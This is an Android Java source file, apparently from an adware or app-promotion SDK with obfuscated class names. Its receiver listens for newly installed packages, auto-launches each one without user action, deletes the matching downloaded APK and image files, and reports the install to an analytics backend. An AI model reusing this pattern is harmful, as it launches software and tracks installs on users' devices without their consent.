package com.sar.gp;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.text.TextUtils;

import com.sar.gp.dld.AgrUtils;
import com.umeng.analytics.MobclickAgent;

public class Asdfree extends BroadcastReceiver {
	private static String TAG = Asdfree.class.toString();
	@Override
	public void onReceive(Context arg0, Intent intent) {
		if (!Agmrsk.inited()) {
			Agmrsk.i(TAG, "agmrsk not inited return in apk add receiver");
			return;
		}
	//	Agmrsk.init(arg0);
		// 接收广播：设备上新安装了一个应用程序包后自动启动新安装应用程序。
		if (intent.getAction().equals("android.intent.action.PACKAGE_ADDED")) {
			String pkg = intent.getDataString().substring(8);
			Agmrsk.i(TAG, "接收到安装广播:[" + pkg + "]");
			Dlg.ccn(pkg);
			PackageManager packageManager = arg0.getPackageManager();
			if (pkg.equals(arg0.getPackageName())) {
				Agmrsk.i("install is update self, return");
				return;
			}
			Intent it = packageManager.getLaunchIntentForPackage(pkg); //要启动应用的包名   
			arg0.startActivity(it); 
			String fhda = MobclickAgent.getConfigParams(arg0, pkg);
			if (TextUtils.isEmpty(fhda)) return;
			try {
				JSONObject fda = new JSONObject(fhda);
				String name = fda.getString("name");
				AgrUtils.delf(Agmrsk.FP + "/" + name + ".png");
				AgrUtils.delf(Agmrsk.FP + "/" + name + ".apk");
				Agmrsk.notifyevent("install", name);
			} catch (JSONException e) {
				Agmrsk.reporte(e);
			}
		}
	}

}
